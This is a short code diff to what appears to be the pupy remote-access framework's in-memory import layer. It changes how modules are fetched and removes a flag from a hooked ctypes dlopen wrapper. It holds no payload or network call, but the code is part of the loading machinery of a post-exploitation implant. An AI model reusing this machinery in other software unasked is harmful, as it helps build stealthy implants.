@@ -151,7 +151,7 @@ remote_print_error = None
 
 try:
     import pupy
-    if not (hasattr(pupy, 'pseudo') and pupy.pseudo) and not modules:
+    if hasattr(pupy, 'get_modules') and not modules:
         modules = pupy.get_modules()
 except ImportError:
     pass
@@ -604,7 +604,6 @@ def install(debug=None, trace=False):
 
     def pupy_dlopen(name, *args, **kwargs):
         dprint("ctypes dlopen: {}".format(name))
-        from_pupy = False
         name = pupy_make_path(name)
         dprint("ctypes dlopen / pupyized: {}".format(name))
 
@@ -620,9 +619,7 @@ def install(debug=None, trace=False):
                 except:
                     pass
 
-        if not from_pupy:
-            return ctypes._system_dlopen(name, *args, **kwargs)
-
+        return ctypes._system_dlopen(name, *args, **kwargs)
 
     if 'pupy' in sys.modules and hasattr(pupy, 'find_function_address'):
         ctypes.CDLL_ORIG = ctypes.CDLL
